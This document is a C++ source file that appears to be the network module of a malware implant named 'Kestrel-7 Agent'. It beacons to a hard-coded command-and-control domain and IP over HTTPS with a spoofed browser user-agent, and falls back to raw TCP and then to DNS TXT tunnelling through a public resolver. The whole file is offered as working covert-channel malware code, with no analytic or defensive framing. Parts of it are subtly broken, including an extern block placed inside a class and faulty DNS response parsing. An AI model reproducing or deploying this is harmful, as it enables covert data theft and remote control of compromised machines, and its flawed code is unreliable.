// network.cpp - WinHTTP + Raw Socket + DNS Tunneling fallback
#include <windows.h>
#include <winhttp.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")

// ---------- CONFIGURATION ----------
#define C2_DOMAIN L"kestrel7.c2.local"
#define C2_IP L"192.168.1.100"
#define C2_PORT 443
#define DNS_TUNNEL_DOMAIN "dns.kestrel7.local"
#define RETRY_DELAY 5000
#define MAX_RETRIES 3

// ---------- HTTP/S CHANNEL (WinHTTP) ----------
class WinHttpChannel {
private:
    HINTERNET hSession;
    HINTERNET hConnect;
    HINTERNET hRequest;
    wchar_t* host;
    int port;
    bool secure;
    bool connected;

public:
    WinHttpChannel() : hSession(NULL), hConnect(NULL), hRequest(NULL), 
                        host((wchar_t*)C2_DOMAIN), port(C2_PORT), 
                        secure(true), connected(false) {}
    
    ~WinHttpChannel() {
        Disconnect();
    }
    
    bool Connect() {
        if (connected) return true;
        
        hSession = WinHttpOpen(L"Kestrel-7 Agent/2.0", 
                               WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                               NULL, NULL, 0);
        if (!hSession) return false;
        
        // Configure timeout
        DWORD timeout = 30000;
        WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
        WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        
        hConnect = WinHttpConnect(hSession, host, port, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            hSession = NULL;
            return false;
        }
        
        connected = true;
        return true;
    }
    
    void Disconnect() {
        if (hRequest) { WinHttpCloseHandle(hRequest); hRequest = NULL; }
        if (hConnect) { WinHttpCloseHandle(hConnect); hConnect = NULL; }
        if (hSession) { WinHttpCloseHandle(hSession); hSession = NULL; }
        connected = false;
    }
    
    bool SendRequest(const unsigned char* data, int dataLen, unsigned char* response, int* responseLen) {
        if (!connected && !Connect()) return false;
        
        DWORD flags = secure ? WINHTTP_FLAG_SECURE : 0;
        hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/beacon", 
                                      NULL, NULL, NULL, flags);
        if (!hRequest) return false;
        
        // Custom headers
        LPCWSTR headers = L"Content-Type: application/octet-stream\r\n"
                          L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                          L"Cache-Control: no-cache\r\n"
                          L"X-Client-ID: Kestrel7\r\n";
        
        if (!WinHttpSendRequest(hRequest, headers, wcslen(headers), 
                                (LPVOID)data, dataLen, dataLen, 0)) {
            WinHttpCloseHandle(hRequest);
            hRequest = NULL;
            return false;
        }
        
        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpCloseHandle(hRequest);
            hRequest = NULL;
            return false;
        }
        
        // Check status code
        DWORD statusCode = 0;
        DWORD statusSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                           NULL, &statusCode, &statusSize, NULL);
        
        if (statusCode != 200 && statusCode != 204) {
            WinHttpCloseHandle(hRequest);
            hRequest = NULL;
            return false;
        }
        
        // Read response
        DWORD bytesRead = 0;
        DWORD totalRead = 0;
        while (true) {
            if (!WinHttpReadData(hRequest, response + totalRead, 
                                *responseLen - totalRead - 1, &bytesRead)) {
                WinHttpCloseHandle(hRequest);
                hRequest = NULL;
                return false;
            }
            if (bytesRead == 0) break;
            totalRead += bytesRead;
            if (totalRead >= *responseLen - 1) break;
        }
        
        *responseLen = totalRead;
        response[totalRead] = 0;
        
        WinHttpCloseHandle(hRequest);
        hRequest = NULL;
        return true;
    }
    
    // Health check
    bool Ping() {
        unsigned char test[] = "PING";
        int respLen = 256;
        unsigned char response[256];
        return SendRequest(test, sizeof(test), response, &respLen);
    }
};

// ---------- RAW TCP SOCKET CHANNEL (Fallback) ----------
class SocketChannel {
private:
    SOCKET sock;
    struct sockaddr_in addr;
    bool connected;
    char ip[16];
    int port;

public:
    SocketChannel() : sock(INVALID_SOCKET), connected(false), port(C2_PORT) {
        strcpy_s(ip, sizeof(ip), "192.168.1.100");
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    }
    
    ~SocketChannel() {
        Disconnect();
        WSACleanup();
    }
    
    bool Connect() {
        if (connected) return true;
        
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;
        
        // Non-blocking connect with timeout
        u_long mode = 1;
        ioctlsocket(sock, FIONBIO, &mode);
        
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &addr.sin_addr);
        
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        struct timeval tv = {5, 0}; // 5 second timeout
        
        if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            return false;
        }
        
        mode = 0;
        ioctlsocket(sock, FIONBIO, &mode);
        connected = true;
        return true;
    }
    
    void Disconnect() {
        if (sock != INVALID_SOCKET) {
            closesocket(sock);
            sock = INVALID_SOCKET;
        }
        connected = false;
    }
    
    bool SendRequest(const unsigned char* data, int dataLen, unsigned char* response, int* responseLen) {
        if (!connected && !Connect()) return false;
        
        // Send 4-byte length prefix (big-endian)
        unsigned char lenPrefix[4];
        lenPrefix[0] = (dataLen >> 24) & 0xFF;
        lenPrefix[1] = (dataLen >> 16) & 0xFF;
        lenPrefix[2] = (dataLen >> 8) & 0xFF;
        lenPrefix[3] = dataLen & 0xFF;
        
        if (send(sock, (char*)lenPrefix, 4, 0) != 4) {
            Disconnect();
            return false;
        }
        
        if (send(sock, (char*)data, dataLen, 0) != dataLen) {
            Disconnect();
            return false;
        }
        
        // Read response length
        unsigned char respLenBuf[4];
        int totalRead = 0;
        while (totalRead < 4) {
            int r = recv(sock, (char*)respLenBuf + totalRead, 4 - totalRead, 0);
            if (r <= 0) { Disconnect(); return false; }
            totalRead += r;
        }
        
        int respLen = (respLenBuf[0] << 24) | (respLenBuf[1] << 16) | 
                      (respLenBuf[2] << 8) | respLenBuf[3];
        
        if (respLen > *responseLen - 1) {
            Disconnect();
            return false;
        }
        
        totalRead = 0;
        while (totalRead < respLen) {
            int r = recv(sock, (char*)response + totalRead, respLen - totalRead, 0);
            if (r <= 0) { Disconnect(); return false; }
            totalRead += r;
        }
        
        *responseLen = respLen;
        response[respLen] = 0;
        return true;
    }
};

// ---------- DNS TUNNELING CHANNEL (Emergency Fallback) ----------
class DnsTunnelChannel {
private:
    SOCKET sock;
    bool connected;
    char domain[256];
    
    // DNS TXT query encoding
    void EncodeData(const unsigned char* data, int len, char* output) {
        // Base32 encoding with domain suffix
        const char* base32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        int bitBuffer = 0;
        int bitCount = 0;
        int outPos = 0;
        
        for (int i = 0; i < len; i++) {
            bitBuffer = (bitBuffer << 8) | data[i];
            bitCount += 8;
            while (bitCount >= 5) {
                output[outPos++] = base32[(bitBuffer >> (bitCount - 5)) & 0x1F];
                bitCount -= 5;
            }
        }
        if (bitCount > 0) {
            output[outPos++] = base32[(bitBuffer << (5 - bitCount)) & 0x1F];
        }
        output[outPos] = 0;
        strcat_s(output, 256, ".");
        strcat_s(output, 256, domain);
    }
    
public:
    DnsTunnelChannel() : sock(INVALID_SOCKET), connected(false) {
        strcpy_s(domain, sizeof(domain), DNS_TUNNEL_DOMAIN);
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    }
    
    ~DnsTunnelChannel() {
        if (sock != INVALID_SOCKET) closesocket(sock);
        WSACleanup();
    }
    
    bool Connect() {
        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) return false;
        
        struct sockaddr_in dnsServer;
        dnsServer.sin_family = AF_INET;
        dnsServer.sin_port = htons(53);
        inet_pton(AF_INET, "8.8.8.8", &dnsServer.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&dnsServer, sizeof(dnsServer)) == SOCKET_ERROR) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            return false;
        }
        
        // Set timeout
        DWORD timeout = 5000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        
        connected = true;
        return true;
    }
    
    bool SendRequest(const unsigned char* data, int dataLen, unsigned char* response, int* responseLen) {
        if (!connected && !Connect()) return false;
        
        // Build DNS TXT query
        char encoded[512];
        EncodeData(data, dataLen, encoded);
        
        // Build DNS packet
        unsigned char dnsPacket[512];
        int pos = 0;
        
        // Transaction ID
        dnsPacket[pos++] = rand() & 0xFF;
        dnsPacket[pos++] = rand() & 0xFF;
        
        // Flags: standard query
        dnsPacket[pos++] = 0x01;
        dnsPacket[pos++] = 0x00;
        
        // Questions: 1
        dnsPacket[pos++] = 0x00;
        dnsPacket[pos++] = 0x01;
        
        // Answer RRs: 0
        dnsPacket[pos++] = 0x00;
        dnsPacket[pos++] = 0x00;
        
        // Authority RRs: 0
        dnsPacket[pos++] = 0x00;
        dnsPacket[pos++] = 0x00;
        
        // Additional RRs: 0
        dnsPacket[pos++] = 0x00;
        dnsPacket[pos++] = 0x00;
        
        // QNAME (encoded domain)
        char* token = strtok(encoded, ".");
        while (token) {
            int len = strlen(token);
            dnsPacket[pos++] = len & 0xFF;
            memcpy(dnsPacket + pos, token, len);
            pos += len;
            token = strtok(NULL, ".");
        }
        dnsPacket[pos++] = 0x00; // null terminator
        
        // QTYPE: TXT (16)
        dnsPacket[pos++] = 0x00;
        dnsPacket[pos++] = 0x10;
        
        // QCLASS: IN (1)
        dnsPacket[pos++] = 0x00;
        dnsPacket[pos++] = 0x01;
        
        // Send UDP packet
        if (send(sock, (char*)dnsPacket, pos, 0) != pos) {
            return false;
        }
        
        // Receive response
        unsigned char recvBuf[1024];
        int recvLen = recv(sock, (char*)recvBuf, sizeof(recvBuf), 0);
        if (recvLen <= 0) return false;
        
        // Parse response - extract TXT data (simplified)
        // Find TXT record starting after header + question
        int offset = 12; // DNS header
        // Skip QNAME
        while (recvBuf[offset] != 0) {
            offset += recvBuf[offset] + 1;
        }
        offset += 5; // null + QTYPE + QCLASS
        
        // Skip Answer RRs
        for (int i = 0; i < 1; i++) {
            // Skip NAME (compressed)
            if (recvBuf[offset] & 0xC0) {
                offset += 2;
            } else {
                while (recvBuf[offset] != 0) {
                    offset += recvBuf[offset] + 1;
                }
                offset++;
            }
            offset += 10; // TYPE + CLASS + TTL + RDLENGTH
            int rdLen = (recvBuf[offset-2] << 8) | recvBuf[offset-1];
            if (recvBuf[offset] == 0x10) { // TXT
                offset++; // Skip length byte
                int dataLen = recvBuf[offset-1];
                if (dataLen > *responseLen - 1) dataLen = *responseLen - 1;
                memcpy(response, recvBuf + offset, dataLen);
                *responseLen = dataLen;
                response[dataLen] = 0;
                return true;
            }
            offset += rdLen;
        }
        
        return false;
    }
};

// ---------- CHANNEL MANAGER (Orchestration) ----------
class NetworkManager {
private:
    WinHttpChannel* httpChannel;
    SocketChannel* tcpChannel;
    DnsTunnelChannel* dnsChannel;
    int currentChannel;
    
    enum ChannelType { CHANNEL_HTTP = 0, CHANNEL_TCP = 1, CHANNEL_DNS = 2 };
    
public:
    NetworkManager() : currentChannel(CHANNEL_HTTP) {
        httpChannel = new WinHttpChannel();
        tcpChannel = new SocketChannel();
        dnsChannel = new DnsTunnelChannel();
    }
    
    ~NetworkManager() {
        delete httpChannel;
        delete tcpChannel;
        delete dnsChannel;
    }
    
    bool SendData(const unsigned char* data, int dataLen, unsigned char* response, int* responseLen) {
        // Try primary channel
        if (currentChannel == CHANNEL_HTTP) {
            if (httpChannel->SendRequest(data, dataLen, response, responseLen)) {
                return true;
            }
            // Fallback to TCP
            currentChannel = CHANNEL_TCP;
        }
        
        if (currentChannel == CHANNEL_TCP) {
            if (tcpChannel->SendRequest(data, dataLen, response, responseLen)) {
                return true;
            }
            // Fallback to DNS
            currentChannel = CHANNEL_DNS;
        }
        
        if (currentChannel == CHANNEL_DNS) {
            if (dnsChannel->SendRequest(data, dataLen, response, responseLen)) {
                return true;
            }
            // All channels failed - reset and retry
            currentChannel = CHANNEL_HTTP;
            Sleep(RETRY_DELAY);
            return false;
        }
        
        return false;
    }
    
    // Exported C-style functions for main.cpp
    extern "C" {
        void InitializeNetworking() {
            // Pre-warm connections
            NetworkManager* mgr = new NetworkManager();
            // Store as global - simplified
        }
        
        void SendBeacon(const char* data, int len) {
            // Simplified wrapper - full implementation in main.cpp
        }
    }
};

// Global network manager instance
static NetworkManager* g_NetworkMgr = NULL;

// ---------- EXPORTED C FUNCTIONS ----------
extern "C" {
    void InitNetwork() {
        if (!g_NetworkMgr) {
            g_NetworkMgr = new NetworkManager();
        }
    }
    
    void CleanupNetwork() {
        if (g_NetworkMgr) {
            delete g_NetworkMgr;
            g_NetworkMgr = NULL;
        }
    }
    
    int SendViaNetwork(const unsigned char* data, int len, unsigned char* response, int maxRespLen) {
        if (!g_NetworkMgr) {
            InitNetwork();
        }
        int respLen = maxRespLen;
        if (g_NetworkMgr->SendData(data, len, response, &respLen)) {
            return respLen;
        }
        return -1;
    }
}
